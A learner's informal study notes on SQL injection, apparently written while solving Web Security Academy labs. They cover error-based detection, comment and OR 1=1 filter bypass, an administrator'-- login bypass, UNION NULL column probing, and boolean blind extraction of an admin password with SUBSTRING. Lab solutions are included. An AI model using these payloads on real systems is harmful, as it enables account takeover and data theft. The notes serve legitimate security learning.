Sql injection attacks;
  - it's an attack that attacker used to extract data of users inside the program and compromise the servers or the backend of the program 
  - it may be done using denial of service attack
  - as I said above it's impact as you know;
    - extract the data of the users like; passwords,credit cards...
how to detect sql injection
as you know  ; you need to test the software to see whehter it has a weaknesses or not
there are some tests you can submit into the application to see;  
  1. single quote '  and look for error
  2. some sql commands 
  3. boolean conditions like; OR 1=1 ..
Most cases that SQL  injections accours are;
1. in where statements
2. select statements
3. insert statements
4. Update statements


now we used SQL injection to extract; hidden data from the website
ex;
https://insecure-website.com/products?category=Gifts'--  -> here we added '-- 
-- -> is a comment in sql which means the restrication after that query make it comment and run this query instead 

this is the query behine the scene;
SELECT * FROM products
WHERE category = 'Gifts'--'
AND released = 1;
after you implement this query it will appear as you see;
SELECT * FROM products
WHERE category = 'Gifts'
no released restrication
ex'
https://insecure-website.com/products?category=Gifts' OR 1=1--

1=1 => true -> which means  choose any items from the table called products either it's categpry called Gifts or any one(true)
the query behined the scene;
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'
AND released = 1; 

category = 'Gifts'
OR
1 = 1
for the first lab ; 
the problem ;
 This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products



here are the solution;
https://0a3a00f5049a1016809fdfd600b000fd.web-security-academy.net/filter?category=Gifts%27+or+1=1--
I added '+or+1=1+-- 
this is the next test that you can add to make a sql injection into the lab 
note that ; '-- didn't show the whole items in the database so we used the other condition

----
2.Subverting application logic

by using query like this ; SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
you will notice that ; '--' => this comments will neglect all of what coming after it.
and just get the username with that name 
the solution of the lab on this;
 This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

the solution;
fill in the name with; administrator'--
then password with any num; 1233 
then click enter it will attack this website forward
---
Retrieving data from other tables:
  first you need to understand how union works in database;
SELECT City, Country FROM Customers
UNION
SELECT City, Country FROM Suppliers
ORDER BY City;
union remove all duplicates between rows + return compining data but without any duplication combine data vertically
return the same number of columns -> the tables to be compared have the same number of cclumns
+compatiple data types
This is called; SQL injection Union attack:
lab;
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 

the soulution will be by adding this ; 'UNION SELECT NULL,NULL,NULL--    -> so the number of the tables are 3 as NULL is accepted 3 times and it's represent any datatype for our program to be matched with the opposite comparing of UNIION

to the response of the page .
notes; why adding  ' before writing injection 
      -> as we need to escape the string that program tried to cover it on our script so we escape this but if the program accept number so we don't need to add ' 
like;
if program need ; username='administrator' you passed to it ;  UNION SELECT NULL,NULL-- -> it will wrap around it a '' so it will be string so it's now can't be read by the database to work on

also we add -- to escape the trailing of the program 

---
# Blind SQL injection volunerabilities;
  - in this sql injection -> we ask database some questions yes,no => 
  - we extract data by asking database tons of questions
  - you may ask it like that ;
    select id  from users where id='1234444455...' 
      if the id exists -> database says ; like welcome to the website or whatever

now steps to do this attack;
  - select id from users where id='1233...' and  '1'='1';
    once the system says  somthing or open the website for you -> this means we can ask database any question
      is the admin pass start with a ...

  - you ask about the first character of the pass of the admin ;
    select id , substring(select pass from users where username='Admin',1,1)='a 
   from users and '1'='1'
      we need to extract the pass of admin character by other untill know it 
      if website open it's gate this means => a is correct else not try again 
      substring(string,1,1)=>1 -> the first character of the pass you ask for 
- also you may ask by ; is letter > "m" ?

so now ; what we will do ;
  - take the cookie of the you -> inject with it a statement like this 
select id from users where id=your cookie' and ' 1 '=' 1';
so to know the password of the user called administrator; we use blind sqlinjection attack
like this ;xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
if return true -> that means first char > m 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
if return false -> first character -> not >t
so it's located from m to t
now 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
if yes -> we know the first character is s 
repeat the process on all the coming characters.

lab ; 

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
Hint

You can assume that the password only contains lowercase, alphanumeric characters.

analysis;
  - blind sql injection 
  - cookie for user
  - if query false -> no error appears , if yes -> pages says welcome back
  - database contain table=user
    - columns -> username,password
  - use blind sql to exploit and extract user password
  - log in as an administrator 
  - assume pass -> contain lowecase+alphanumeric chars.
















  
